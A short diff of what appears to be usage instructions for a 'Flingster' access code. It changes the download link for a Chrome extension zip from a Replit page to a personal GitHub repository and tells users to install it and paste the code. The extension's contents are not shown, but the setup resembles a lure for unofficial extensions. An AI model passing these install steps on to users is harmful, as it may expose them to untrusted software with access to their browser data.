@@ -26,7 +26,7 @@ HOW TO USE THE ACCESS CODE
 
 Desktop / Laptop Users:
 - Install the Chrome Extension from:
- https://replit.com/@devlopermMan43/Flingster-Extension-10zip
+ https://github.com/devloperman41/Flingster_slot_booking/blob/main/Flingster-Access-Extension.zip
 - Open the extension
 - Paste the Access Code
 - Start using the service
